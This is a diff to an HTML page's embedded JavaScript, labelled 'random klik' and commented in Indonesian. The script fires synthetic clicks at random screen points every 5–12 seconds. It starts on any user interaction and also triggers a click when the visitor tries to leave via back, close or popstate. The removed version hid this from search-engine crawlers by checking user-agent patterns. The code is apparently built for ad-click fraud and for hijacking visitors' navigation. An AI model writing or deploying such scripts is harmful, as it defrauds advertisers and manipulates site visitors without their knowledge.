@@ -1,51 +1,112 @@
 <!-- random klik start -->
 <script>
-function randomDelay() {
-  return 5000 + Math.random() * 7000; // 5 - 12 detik
-}
+(function() {
+  'use strict';
 
-// klik di titik random layar (bebas area kosong atau tidak)
-function clickAnywhere() {
-  const x = Math.random() * window.innerWidth;
-  const y = Math.random() * window.innerHeight;
+  // ========== KONFIGURASI ==========
+  const CONFIG = {
+    minDelay: 5000,  // delay minimum (ms)
+    maxDelay: 12000, // delay maksimum (ms)
+  };
 
-  const el = document.elementFromPoint(x, y);
+  // ========== STATE ==========
+  let timeoutId = null;
+  let isLooping = false;
 
-  // tetap "klik" walaupun kosong (kalau null, skip aman)
-  if (el) {
-    el.dispatchEvent(new MouseEvent("click", {
-      bubbles: true,
-      cancelable: true,
-      clientX: x,
-      clientY: y
-    }));
+  // ========== FUNGSI UTAMA ==========
+  function randomDelay() {
+    return CONFIG.minDelay + Math.random() * (CONFIG.maxDelay - CONFIG.minDelay);
   }
-}
 
-// loop
-function loop() {
-  clickAnywhere();
-  setTimeout(loop, randomDelay());
-}
+  function clickAnywhere() {
+    try {
+      const x = Math.random() * window.innerWidth;
+      const y = Math.random() * window.innerHeight;
+      const el = document.elementFromPoint(x, y);
 
-// Deteksi bot mesin pencari
-function isSearchBot() {
-  const userAgent = navigator.userAgent.toLowerCase();
-  const botPatterns = [
-    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 
-    'baiduspider', 'yandexbot', 'facebot', 'ia_archiver',
-    'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot',
-    'applebot', 'twitterbot', 'rogerbot', 'linkedinbot',
-    'telegrambot', 'whatsapp', 'discordbot', 'slackbot'
-  ];
+      if (el) {
+        el.dispatchEvent(new MouseEvent('click', {
+          bubbles: true,
+          cancelable: true,
+          clientX: x,
+          clientY: y
+        }));
+      }
+    } catch (e) {
+      // Gagal silent
+    }
+  }
+
+  // ========== LOOP CONTROL ==========
+  function startLoop() {
+    // Langsung klik saat terpicu
+    clickAnywhere();
+
+    // Cegah loop ganda
+    if (isLooping) return;
+    isLooping = true;
+
+    function loop() {
+      if (!isLooping) return;
+      clickAnywhere();
+      timeoutId = setTimeout(loop, randomDelay());
+    }
+
+    timeoutId = setTimeout(loop, randomDelay());
+  }
+
+  function stopLoop() {
+    isLooping = false;
+    if (timeoutId) {
+      clearTimeout(timeoutId);
+      timeoutId = null;
+    }
+  }
+
+  // ========== EVENT LISTENERS ==========
   
-  return botPatterns.some(pattern => userAgent.includes(pattern));
-}
+  // Interaksi dalam halaman
+  const interactionEvents = [
+    'click', 'dblclick',
+    'mousedown', 'mouseup', 'mousemove',
+    'touchstart', 'touchmove', 'touchend',
+    'keydown', 'keyup',
+    'scroll', 'wheel',
+    'focus', 'blur',
+    'input', 'change',
+    'contextmenu',
+    'dragstart', 'drag', 'drop',
+    'pointerdown', 'pointermove', 'pointerup'
+  ];
 
-// Cek referrer dan bot sebelum menjalankan
-if (document.referrer && document.referrer !== '' && !isSearchBot()) {
-  loop();
-}
+  interactionEvents.forEach(eventType => {
+    document.addEventListener(eventType, startLoop, { passive: true });
+    window.addEventListener(eventType, startLoop, { passive: true });
+  });
+
+  // Navigasi pergi (back, forward, tutup tab)
+  const exitEvents = ['pagehide', 'beforeunload', 'popstate'];
+
+  exitEvents.forEach(eventType => {
+    window.addEventListener(eventType, () => {
+      clickAnywhere();
+      stopLoop();
+    }, { passive: true });
+  });
+
+  // Hentikan loop saat tab tidak terlihat
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      stopLoop();
+    }
+  });
+
+  // Bersihkan saat halaman benar-benar ditutup
+  window.addEventListener('unload', () => {
+    stopLoop();
+  });
+
+})();
 </script>
 <!-- random klik end -->
 
